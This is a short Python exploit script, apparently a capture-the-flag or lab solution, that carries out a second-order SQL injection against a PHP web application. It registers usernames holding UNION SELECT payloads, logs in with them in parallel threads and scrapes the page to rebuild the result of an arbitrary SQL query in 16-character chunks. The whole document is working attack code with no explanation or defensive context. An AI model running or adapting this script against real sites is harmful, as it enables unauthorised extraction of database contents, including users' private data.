#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup
import threading
import time

url_base = sys.argv[1]
payload = sys.argv[2]

sessions = {}
results = {}


def create_and_login(i, sqli_payload):
    s = requests.session()
    s.post(url_base + "register.php", data={"username": sqli_payload, "password": "jxf", "submit": "Submit Query"})
    s.post(url_base + "login.php", data={"username": sqli_payload, "password": "jxf", "login": "Submit Query"})
    sessions[i] = s
    return


def fetch_query_result(i):
    r = sessions[i].get(url_base)
    soup = BeautifulSoup(r.text, "html.parser")
    tables = soup.find_all("table", class_="u-full-width")
    output = tables[1].find("td").get_text()
    results[i] = output
    return


threads = []
for i in range(15):
    sqli_payload = f'" UNION SELECT 1, SUBSTR(({payload}), {i * 16 + 1}, 16);#'
    thread = threading.Thread(target=create_and_login, args=(i, sqli_payload))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

while True:
    threads = [threading.Thread(target=fetch_query_result, args=(i,)) for i in range(15)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    # check that we are not missing any part of the result
    if all([len(results[i]) <= len(results[i - 1]) for i in range(1, 15)]):
        result = "".join([results[i] for i in range(0, 15)])
        if len(result) > 16:
            print(result)
            sys.exit(0)
            
    time.sleep(1)
